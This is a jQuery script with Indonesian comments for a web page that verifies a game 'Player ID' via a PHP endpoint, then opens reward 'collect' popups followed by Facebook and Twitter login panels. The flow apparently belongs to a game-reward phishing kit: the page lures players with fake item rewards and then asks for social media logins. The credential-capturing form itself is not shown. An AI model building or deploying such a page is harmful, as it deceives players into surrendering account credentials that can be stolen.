// tombol untuk memunculkan popup
function checkId() {
	var playId = $("#playId").val();

	if(playId == "") {
		$(".errorMsg").html('<span class="zmdi zmdi-close-circle" style="margin-right: 5px;"></span> Player ID Tidak Boleh Kosong');
		$(".errorMsg").show();
	} else {
		$.ajax({
			url: 'assets/system/trueId.php',
			type: 'POST',
			data: 'playId='+playId,
			beforeSend: function() {
				$(".errorMsg").html('<span class="zmdi zmdi-spinner zmdi-hc-spin" style="margin-right: 5px;"></span> Memverifikasi Player ID');
				$(".errorMsg").show();
			},
			success: function(response) {
				if(response == "") {
					$(".errorMsg").html('<span class="zmdi zmdi-close-circle" style="margin-right: 5px;"></span> Player ID Tidak Ditemukan');
					$(".errorMsg").show();
				} else {
					$("#setNick").html(response);
					$("input#getUId").val(playId);
					$("input#getNickId").val(response);
					$(".welcome").hide();
				}
			}
		});
	}
}
function collect(obj){
	var $src = $(this).attr("src");
	$('#arpantek-img').attr("src", $src);
	$('.collect').show();
	$("#arpantek-img").attr("src", $src);
}
function login(){
	$('.login').show();
}
function collect1(){
	$('.pop3').show();
}
function collect2(){
	$('.popup2').show();
}
function collect3(){
	$('.popup3').show();
}
function collect4(){
	$('.popup4').show();
}
function collect5(){
	$('.popup5').show();
}
function collect6(){
	$('.popup6').show();
}
function collect7(){
	$('.popup7').show();
}
function open_login(){
	$('.open_login').show();
	$('.collect').hide();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.open_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.open_login').hide();
}

// tombol untuk menutup popup
function closepopup(){
	$(".popup").hide()
	
}
function klos1(){
	$(".popup1").hide()
	
}
function klos2(){
	$(".popup2").hide()
	
}
function klos3(){
	$(".popup3").hide()
	
}
function klos4(){
	$(".popup4").hide()
	
}function klos5(){
	$(".popup5").hide()
	
}
function klos6(){
	$(".popup6").hide()
	
}function klos7(){
	$(".popup7").hide()
	
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.open_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.open_login').show();
}